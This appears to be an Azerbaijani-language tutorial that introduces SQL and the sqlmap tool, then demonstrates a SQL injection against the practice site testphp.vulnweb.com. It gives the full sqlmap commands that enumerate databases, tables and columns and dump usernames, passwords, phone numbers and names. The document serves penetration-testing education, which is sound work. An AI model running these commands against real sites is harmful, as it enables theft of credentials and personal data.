SQL Nədir?

SQL (Structured Query Language) verilənlər bazası əməliyyatları üçün istifadə olunan sadə dildir. Demək olar ki, bir çox proqram və veb xidmətləri verilənlər bazası ehtiva edir. Verilənlər bazasını bir növ ərzaq kitabı kimi düşünün. Baqqal əmi kimi o kitabı yazacaqsan, həm də istədiyin vaxt silib redaktə edə biləcəksən, ya da istədiyin vaxt zəng edib lazımi işləri görəcəksən. Bu, rəqəmsallaşan dünyamıza, baqqal dayının elektron dilinə uyğunlaşmaq üçün formalaşmış bir növ dildir.

SQLMAP Nədir?

Sqlmap açıq mənbəli sql injection zəifliyinin aşkarlanması və istismarı vasitəsidir. O, ona təqdim edilən hədəf veb tətbiqi tərəfindən istifadə edilən verilənlər bazası sisteminə müxtəlif sorğular/əmrlər göndərməklə sistemdə sql inyeksiyasının növünü aşkar edir. Yenə hədəf verilənlər bazasından ona verilən parametrlərə uyğun müxtəlif məlumatlar götürür. Bu, Terminal / Komanda Pəncərəsi, yəni konsol ekranı vasitəsilə işləyən SQL Injection zəiflikləri üçün istifadə edə biləcəyiniz səmərəli və məntiqi test (pentest) alətidir. Komanda xəttində işlədiyindən və Python ilə işləndiyindən, bir çox əməliyyat sistemləri ilə işləyir. (Linux paylamaları, Windows, MacOS) Təhlükəsizlik zəifliklərini (zəifliklərini) tapmaqdan əlavə, sızmış istifadəçinin həssas məlumatlarını redaktə etmək, baxmaq, silmək kimi fantastik xüsusiyyətlərə malikdir. Bir çox DBSM (Data-Base Management System) ilə uyğun gəlir. O, həmçinin bir çox inyeksiya üsullarından istifadə edə bilər. Bundan əlavə, siz təmin etdiyiniz bir neçə parametrlə, yəni öz daxilindəki konfiqurasiyalardan istifadə etməklə zəiflikləri skan edə bilərsiniz.

Əsasən bir şey öyrəndiyimizə görə, tətbiqlərimizə başlaya bilərik. Mən həmişəki kimi Kali Linux istifadə edəcəyəm. Hansı əməliyyat sistemindən istifadə etməyiniz çox da önəmli olmayacaq. Kali-də sqlmap artıq quraşdırılıb. Əgər başqa əməliyyat sistemi istifadə edirsinizsə və ya quraşdırılmayıbsa, yuxarıda verdiyim linkdən yükləyə bilərsiniz. Əgər siz Linux istifadəçisisinizsə, terminalınıza "apt install sqlmap" əmrini yazdığınız zaman o yüklənəcək. –dbs: verilənlər bazalarını göstərir. –cədvəllər: verilənlər bazasında cədvəlləri göstərir. –sütunlar: Verilənlər bazasındakı sütunlar göstərilir. – dump: DBMS verilənlər bazası qeydlərini boşaltın.

SQLMAP Tool-un İstifadəsi:

İlk öncə terminalda "sqlmap" yazıb Enter edirik:

Sqlmap --h:

Əvvəlcə kali linux-da bir Web Browser açırıq. Daha sonra Web Browser-də "vulnweb" yazıb enter edirik qarşımıza çıxan ilk səhifəyə daxil oluruq və daha sonra səhifədəki 2-ci linkə daxil oluruq. Daha sonra qarşımıza çıxan səhifədə "sing up" yerinə gəlirik və gördüyümüz kimi bizdən "username" və "password" isdəyir biz "sqlmap tool-dan" istifadə etməklə məlumatları götürəciyik:


Data Base:

Əvvəlcə Data baselər-ə baxmaq üçün "sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=2" --dbs " yazırıq və Enter edirik. Gördüyümüz kimi qarşımıza 2 ədəd Data Base çıxır: 1)acuart 2)information_schema


Tables:

Daha sonra Tables-ı gətirmək üçün "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart --tables" yazırıq və Enter edirik:


Columns:

Sütunları gətirmək üçün isə: "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D (Data base-in baş hərifi) acuart -T (Tables-in baş hərifi) users --columns" yazıb Enter edirik.


Username-in Tapılması:

Sütunlardan da gördüyümüz kimi "pass, uname, credi card, email , name və.s" kimi məlumatlari tapmaq olar amma biz "pass və uname" tapsaq işimiz tamamlanır. Username-i tapmaq üçün: "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D(Data base-in baş hərifi) acuart -T(Tables-in baş hərifi) users -C(Columns-un baş hərifi) uname --dump" yazıb Enter edirik. Və gördüyümüz kimi Username tapıldı cavap test-dir


Password-n Tapılması:

Password-u tapmaq üçün isə "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C pass --dump " yazıb Enter edirik. Və Password-muz da tapıldı cavap test-dir.


Signup Hissəsi:

Həm Username Həm də Password-u tapdığımıza görə "signup" hissəsindən Qeydiyatdan keçib daxil ola bilərik və şəkildə də gördüyümüz kimi biz phone number,name,email,credicard number-i də görə bilərik:


Phone number:

Bundan əlavə biz qeydiyatdan keçmədən də Phone Number-i , Name-i öyrənə bilərik. ilk öncə phone number-dən başlayaq bunun üçün "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C phone --dump" yazıb Enter edirik.


Name:

Name-i öyrənmək üçün isə "sqlmap -u"http://testphp.vulnweb.com/listproducts.php?cat=2" -D acuart -T users -C name --dump" yazıb Enter edirik.


Qeyd: Eyni ardıcıllıqla biz səhifədə qeydiyatdan keçmədən email,credi card,adress məlumatlarında da tapa bilərik.
